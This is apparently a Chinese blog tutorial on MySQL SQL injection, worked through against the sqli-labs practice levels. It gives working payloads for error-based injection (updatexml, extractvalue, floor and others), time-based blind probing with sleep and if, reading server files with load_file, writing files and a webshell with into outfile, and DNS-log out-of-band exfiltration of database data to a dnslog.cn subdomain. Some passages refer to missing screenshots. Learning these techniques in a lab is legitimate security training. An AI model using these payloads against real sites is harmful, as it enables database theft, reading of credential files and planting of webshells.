    1.相关函数

    1.1sleep()

    Sleep 函数可以使计算机程序（进程，任务或线程）进入休眠
    比如：我们在正常查数据时的正常速度
    这是使用sleep函数后的速度
    因为有两条数据所以花了6秒钟

    1.2if()

    if是计算机编程语言中常见的分支结构，if(a,b,c)相当于三目运算符，a相当于条件体，如果a成立则输入b，负责输入c
    也可以结合sleep一起使用

    响应时间3秒由此可见该数据库的名字为test

    1.3length()

    可以使用length来判断数据的长度
    可以看到网页加载了4秒左右，由此可见该网站的数据库名长度为8
    语句:?id=1 and sleep(if(length(database())=8,4,0))

    1.4mid()

    此函数为截取字符串的一部分
    mid(a,b,c)
    a 必需，表示为要提取字符的字段
    b 必需，表示为规定开始的位置(起始为1)
    c 可选，表示为规定结束的位置（如果省略，mid函数会返回剩余的所有字符）
    例如:mid(hello,1,3) -> hel
    Mid(hello,1) -> hello

    1.5 substr()和substring()

    Substr()和substring()函数实现的功能是一样的，均为截取字符串。string substring(string, start, length) string substr(string, start, length) 参数描述同mid()函数，第一个参数为要处理的字符串，start为开始位置，length为截取的长度。

    1.6left()

    Left()得到字符串左部指定个数的字符
    Left ( string, n ) string为要截取的字符串，n为长度。

    1.7ascii()

    推荐使用ASCII码
    1.防止引号 ‘ “ 转义
    2.方便以后工具的使用

    3.报错盲注

    3.1什么是报错盲注

    报错盲注就是利用了数据库的某些机制，人为的制造错误条件，使得查询结果出现在报错提示中。

    3.2报错盲注的前提

    页面上没有回显点，但是必须有SQL语句执行错误的信息。

    3.3. 常见的报错注入函数

    1.floor() 　　如：select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);

2.extractvalue()　　如：select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));

3.updatexml()　　如：select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));

4.geometrycollection()　　如：select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));

5.multipoint()　　如：select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));

6.polygon()　　如：select * from test where id=1 and polygon((select * from(select * from(select user())a)b));

7.multipolygon()　　如：select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));

8.linestring()　　如：select * from test where id=1 and linestring((select * from(select * from(select user())a)b));

9.multilinestring()　　如：select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));

10.exp()　　如：select * from test where id=1 and exp(~(select * from(select user())a));

    updatexml():从目标XML中更改包含所查询值的字符串
    updatexml(xml_doument,XPath_string,new_value)
    第一个参数：XML的内容
    第二个参数：是需要update的位置XPATH路径
    第三个参数：是更新后的内容
    extractvalue():从目标XML中返回包含所查询值的字符串
    第一个参数：XML_document 是String格式，为XML文档对象的名称，文中为DOC
    第二个参数：XPath_String (Xpath格式字符串)
    这两个函数的第二个参数都是XPath,无论你使用那个函数，只要XPath的格式错了都会报错

    3.4实战 sqli-labs第1关

    2. 使用updatexml()爆破:?id=1’ and (updatexml(1,concat(0x7e,(select substr((select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA),1,32)),0x7e),1))–+

    4.时间盲注

    4.1什么是时间盲注

    延时注入是指通过制造延时注入语句后，浏览器的响应时间来判断正确的数据

    4.2应用场景

    延时注入的应用场景是，在我们输入and 1或者and 0的时候，页面的返回无变化，这个时候可以通过and sleep(5)来判断一下页面的响应时间，相应时间在五秒多一点的话，说明此处可以使用延时注入

    4.3弊端

    使用较少，我们在判断数据的正确性时是通过对所有字母，数字，特殊字符进行猜测，效率太低了，而且浏览器的延迟有很多外在因素，例如:网速太慢，电脑硬件问题..

    4.4实战：sqli-labs第9关

    1. 无论输入什么都显示正确，不显示报错信息
    2. 使用if()和sleep()测试，?id=1’ and if(1=2,1,sleep(5))–+发生了延迟，因此可见，该关为时间盲注
    3. 判断数据库名长度?id=1’ and if(length(database())=8,1,sleep(5))–+
    4. 使用爆破工具爆破数据库名，延迟在5000ms以上的都是数据库名中的字符

    5.堆叠注入

    5.1什么是 堆叠注入

    在SQL中，分号 ；是用来表示一条sql语句的结束，试想一下我们在 ； 结束一个sql语句后面继续构造下一个语句 会不会一起执行？因此这个想法也就造就了堆叠注入。

    6.文件读写

    6.1前提

    必须要有root权限
    我们要在my.ini文件里进行配置
    secure_file_priv=
    代表对文件读写没有限制
    secure_file_priv=NULL
    代表不能进行文件读写
    secure_file_priv=d:/phpstudy/mysql/data
    代表只能对该路径下文件进行读写

    6.2文件读写注入的原理

    就是利用文件的读写权限进行注入，它可以写入一句话木马，也可以读取系统文件的敏感信息。

    6.3读取文件

    使用函数：load_file()
    后面的路径可以是单引号，0x，char转换的字符。
    注意：路径中斜杠是/不是\。
    一般可以与union中做为一个字段使用，查看config.php(即mysql的密码)，apache配置…
    ?id=-1’ union select 1,load_file(‘d:/1.txt’),3–+

    6.4写入文件

    使用函数：Into Outfile（能写入多行，按格式输出）和 into Dumpfile（只能写入一行且没有输出格式）
    outfile 后面不能接0x开头或者char转换以后的路径，只能是单引号路径
    这里我们创建一个名为lj的txt文件并在里面写入内容为lijun
    ?id=1 union select 1,’lijun’,3 into outfile ‘e:/lj.txt’

    6.5实战：sqli-labs第7关

    1. ?id=1看到了outfile
    2. ?id=1’)) union select 1,’666’,3 into outfile ‘d:/wd.txt’–+
    3. 上传木马：?id=1’)) and 1=2 union select 1,2,”“%20 into outfile “D:\shell.php”–+

    7.dnslog.cn使用

    打开yakit->点击反连->点击dns->点击生成一个可用域名
    “\\“ 四个\不能少
    注意.uifm3e.dnslog.cn是你的子域名，前面要加个.。
    后面的\xxx.txt，\是必须的，xxx.txt这部分随便是什么内容，不能为空。
    查看版本信息：（注意包裹符
    ?id=1’ and load_file(concat(“\\“,version(),”.vo9tus.dnslog.cn\robots.txt”)) – -
